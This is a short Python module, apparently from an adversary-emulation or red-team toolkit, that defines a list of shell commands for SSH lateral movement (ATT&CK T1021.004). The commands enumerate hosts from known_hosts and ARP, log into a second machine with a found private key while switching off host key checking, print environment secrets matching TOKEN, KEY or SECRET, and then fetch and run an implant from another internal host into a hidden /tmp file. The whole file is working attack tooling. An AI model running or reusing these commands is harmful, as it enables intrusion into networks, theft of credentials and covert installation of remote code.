"""
SSH Lateral Movement (T1021.004)

Uses SSH keys found during recon to pivot to secondary hosts.
"""

SSH_LATERAL_COMMANDS = [
    "echo '=== SSH LATERAL ==='",
    # Enumerate reachable hosts from known_hosts + ARP
    "cat ~/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sed 's/|.*//'",
    "arp -n 2>/dev/null | grep -v incomplete",
    # Try to SSH to secondary victim using found key
    "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i ~/.ssh/id_rsa "
    "ubuntu@10.4.60.41 'hostname; whoami; id; env | grep -iE TOKEN|KEY|SECRET' 2>/dev/null",
    # If successful, drop implant on secondary
    "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i ~/.ssh/id_rsa "
    "ubuntu@10.4.60.41 'curl -s http://10.4.60.21:8080/implant.py -o /tmp/.cache_ds2.py && python3 /tmp/.cache_ds2.py &' 2>/dev/null",
]
